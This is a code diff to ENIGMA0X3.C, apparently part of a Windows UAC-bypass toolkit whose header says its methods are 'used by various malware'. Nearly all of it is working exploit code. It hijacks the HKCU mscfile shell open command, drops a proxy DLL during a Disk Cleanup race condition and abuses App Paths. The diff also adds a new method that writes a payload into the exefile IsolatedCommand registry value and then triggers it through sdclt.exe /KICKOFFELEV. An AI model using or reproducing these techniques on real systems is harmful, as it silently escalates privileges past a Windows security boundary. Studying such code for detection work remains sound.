@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     2.59
+*  VERSION:     2.70
 *
-*  DATE:        15 Mar 2017
+*  DATE:        25 Mar 2017
 *
 *  Enigma0x3 autoelevation methods.
 *  Used by various malware.
@@ -15,6 +15,7 @@
 *  https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
 *  https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/
 *  https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
+*  https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -23,6 +24,8 @@
 *
 *******************************************************************************/
 #include "global.h"
+
+UCM_ENIGMA0x3_CTX g_EnigmaThreadCtx;
 
 /*
 * ucmHijackShellCommandMethod
@@ -34,8 +37,10 @@
 */
 BOOL ucmHijackShellCommandMethod(
     _In_opt_ LPWSTR lpszPayload,
-    _In_ LPWSTR lpszTargetApp
-    )
+    _In_ LPWSTR lpszTargetApp,
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
 {
     BOOL    bCond = FALSE, bResult = FALSE;
     HKEY    hKey = NULL;
@@ -46,7 +51,7 @@ BOOL ucmHijackShellCommandMethod(
 
     if (lpszTargetApp == NULL)
         return FALSE;
-    
+
     do {
 
         sz = 0;
@@ -56,7 +61,7 @@ BOOL ucmHijackShellCommandMethod(
         else {
             sz = _strlen(lpszPayload) * sizeof(WCHAR);
         }
-        lpBuffer = RtlAllocateHeap(g_ctx.Peb->ProcessHeap, HEAP_ZERO_MEMORY, sz);
+        lpBuffer = supHeapAlloc(sz);
         if (lpBuffer == NULL)
             break;
 
@@ -69,7 +74,7 @@ BOOL ucmHijackShellCommandMethod(
             _strcpy(szBuffer, g_ctx.szTempDirectory);
             _strcat(szBuffer, WDSCORE_DLL);
             //write proxy dll to disk
-            if (!supWriteBufferToFile(szBuffer, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+            if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
                 break;
             }
 
@@ -79,7 +84,7 @@ BOOL ucmHijackShellCommandMethod(
             _strcat(lpBuffer, L",WdsInitialize");
         }
 
-        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, 
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
             L"Software\\Classes\\mscfile\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
 
         if (lResult != ERROR_SUCCESS)
@@ -96,7 +101,7 @@ BOOL ucmHijackShellCommandMethod(
     } while (bCond);
 
     if (lpBuffer != NULL)
-        RtlFreeHeap(g_ctx.Peb->ProcessHeap, 0, lpBuffer);
+        supHeapFree(lpBuffer);
 
     if (hKey != NULL)
         RegCloseKey(hKey);
@@ -122,12 +127,12 @@ DWORD ucmDiskCleanupWorkerThread(
     SIZE_T                      sz;
     PVOID                       Buffer = NULL;
     LPWSTR                      fp = NULL;
-    UACMECONTEXT               *Context = (UACMECONTEXT *)Parameter;
+    UCM_ENIGMA0x3_CTX          *Context = (UCM_ENIGMA0x3_CTX *)Parameter;
     FILE_NOTIFY_INFORMATION    *pInfo = NULL;
     UNICODE_STRING              usName;
     IO_STATUS_BLOCK             IoStatusBlock;
     OBJECT_ATTRIBUTES           ObjectAttributes;
-    WCHAR                       szFileName[MAX_PATH * 2], szTempBuffer[MAX_PATH];
+    WCHAR                       szFileName[MAX_PATH * 2], szTempBuffer[MAX_PATH + 1];
 
     do {
 
@@ -153,7 +158,7 @@ DWORD ucmDiskCleanupWorkerThread(
             break;
 
         sz = 1024 * 1024;
-        Buffer = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sz);
+        Buffer = supHeapAlloc(sz);
         if (Buffer == NULL)
             break;
 
@@ -168,7 +173,7 @@ DWORD ucmDiskCleanupWorkerThread(
                 &IoStatusBlock, Buffer, (ULONG)sz, FILE_NOTIFY_CHANGE_FILE_NAME, TRUE);
 
             if (status == STATUS_PENDING)
-                NtWaitForSingleObject(hEvent, TRUE, NULL);          
+                NtWaitForSingleObject(hEvent, TRUE, NULL);
 
             NtSetEvent(hEvent, NULL);
 
@@ -179,7 +184,7 @@ DWORD ucmDiskCleanupWorkerThread(
 
                     RtlSecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
                     _strncpy(szTempBuffer, MAX_PATH, pInfo->FileName, pInfo->FileNameLength / sizeof(WCHAR));
-                    
+
                     if ((szTempBuffer[8] == L'-') &&      //
                         (szTempBuffer[13] == L'-') &&     // If GUID form directory name.
                         (szTempBuffer[18] == L'-') &&     //
@@ -224,7 +229,7 @@ DWORD ucmDiskCleanupWorkerThread(
         NtClose(hEvent);
 
     if (Buffer != NULL)
-        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Buffer);
+        supHeapFree(Buffer);
 
     return 0;
 }
@@ -240,7 +245,8 @@ DWORD ucmDiskCleanupWorkerThread(
 *
 */
 BOOL ucmDiskCleanupRaceCondition(
-    VOID
+    _In_ PVOID PayloadDll,
+    _In_ DWORD PayloadDllSize
 )
 {
     BOOL                bResult = FALSE;
@@ -248,7 +254,13 @@ BOOL ucmDiskCleanupRaceCondition(
     HANDLE              hThread = NULL;
     SHELLEXECUTEINFOW   shinfo;
 
-    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ucmDiskCleanupWorkerThread, &g_ctx, 0, &ti);
+    RtlSecureZeroMemory(&g_EnigmaThreadCtx, sizeof(g_EnigmaThreadCtx));
+
+    g_EnigmaThreadCtx.PayloadDll = PayloadDll;
+    g_EnigmaThreadCtx.PayloadDllSize = PayloadDllSize;
+    _strcpy(g_EnigmaThreadCtx.szTempDirectory, g_ctx.szTempDirectory);
+
+    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ucmDiskCleanupWorkerThread, &g_EnigmaThreadCtx, 0, &ti);
     if (hThread) {
         RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
         shinfo.cbSize = sizeof(shinfo);
@@ -281,7 +293,7 @@ BOOL ucmDiskCleanupRaceCondition(
 *
 * Give target application our payload to execute because we can control App Path key data.
 *
-* E.g. 
+* E.g.
 * lpszPayload = your.exe
 * lpszAppPathTarget = control.exe
 * lpszTargetApp = sdclt.exe
@@ -302,7 +314,7 @@ BOOL ucmAppPathMethod(
     HKEY    hKey = NULL;
     LPWSTR  lpKeyPath = NULL, lpBuffer = NULL;
     SIZE_T  sz;
-    WCHAR   szBuffer[MAX_PATH * 2];
+    WCHAR   szBuffer[MAX_PATH + 1];
 
 #ifndef _WIN64
     PVOID   OldValue = NULL;
@@ -331,7 +343,7 @@ BOOL ucmAppPathMethod(
         else {
             sz = _strlen(lpszPayload) * sizeof(WCHAR);
         }
-        lpBuffer = RtlAllocateHeap(g_ctx.Peb->ProcessHeap, HEAP_ZERO_MEMORY, sz);
+        lpBuffer = supHeapAlloc(sz);
         if (lpBuffer == NULL)
             break;
 
@@ -346,7 +358,7 @@ BOOL ucmAppPathMethod(
         }
 
         sz = (1 + _strlen(lpszAppPathTarget)) * sizeof(WCHAR) + sizeof(T_APP_PATH);
-        lpKeyPath = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sz);
+        lpKeyPath = supHeapAlloc(sz);
         if (lpKeyPath == NULL)
             break;
 
@@ -378,14 +390,118 @@ BOOL ucmAppPathMethod(
     } while (bCond);
 
     if (lpKeyPath != NULL)
-        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, lpKeyPath);
+        supHeapFree(lpKeyPath);
 
     if (lpBuffer != NULL)
-        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, lpBuffer);
+        supHeapFree(lpBuffer);
 
     //
     // Reenable wow64 redirection if under wow64.
     //
+#ifndef _WIN64
+    if (g_ctx.IsWow64) {
+        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+    }
+#endif
+
+    return bResult;
+}
+
+/*
+* ucmSdcltIsolatedCommandMethod
+*
+* Purpose:
+*
+* Use IsolatedCommand value of exefile shell command for your payload.
+* Trigger: sdclt.exe with /kickoffelev param (force it to use ShellExecuteEx)
+*
+*/
+BOOL ucmSdcltIsolatedCommandMethod(
+    _In_opt_ LPWSTR lpszPayload
+)
+{
+    BOOL    bResult = FALSE, bCond = FALSE, bExist = FALSE;
+    DWORD   cbData, cbOldData;
+    SIZE_T  sz = 0;
+    LRESULT lResult;
+#ifndef _WIN64
+    PVOID   OldValue;
+#endif
+    LPWSTR  lpBuffer = NULL;
+    HKEY    hKey = NULL;
+
+    WCHAR szBuffer[MAX_PATH + 1];
+    WCHAR szOldValue[MAX_PATH + 1];
+
+#ifndef _WIN64
+    if (g_ctx.IsWow64) {
+        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
+            return FALSE;
+    }
+#endif
+
+    do {
+
+        if (lpszPayload != NULL) {
+            lpBuffer = lpszPayload;
+            sz = _strlen(lpszPayload);
+        }
+        else {
+            //no payload specified, use default cmd.exe
+            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
+            sz = _strlen(szBuffer);
+            lpBuffer = szBuffer;
+        }
+
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, T_EXEFILE_SHELL, 0, NULL,
+            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        //
+        // Save old value if exist.
+        //
+        cbOldData = MAX_PATH * 2;
+        lResult = RegQueryValueEx(hKey, T_ISOLATEDCOMMAND, 0, NULL,
+            (BYTE*)szOldValue, &cbOldData);
+        if (lResult == ERROR_SUCCESS)
+            bExist = TRUE;
+
+        cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
+
+        lResult = RegSetValueEx(
+            hKey,
+            T_ISOLATEDCOMMAND,
+            0, REG_SZ,
+            (BYTE*)lpBuffer,
+            cbData
+        );
+        if (lResult == ERROR_SUCCESS) {
+            _strcpy(szBuffer, g_ctx.szSystemDirectory);
+            _strcat(szBuffer, SDCLT_EXE);
+            bResult = supRunProcess(szBuffer, L"/KICKOFFELEV");
+            if (bExist == FALSE) {
+                //
+                // We created this value, remove it.
+                //
+                RegDeleteValue(hKey, T_ISOLATEDCOMMAND);
+            }
+            else {
+                //
+                // Value was before us, restore original.
+                //
+                RegSetValueEx(hKey, T_ISOLATEDCOMMAND, 0, REG_SZ,
+                    (BYTE*)szOldValue, cbOldData);
+            }
+        }
+
+    } while (bCond);
+
+    if (hKey != NULL)
+        RegCloseKey(hKey);
+
 #ifndef _WIN64
     if (g_ctx.IsWow64) {
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
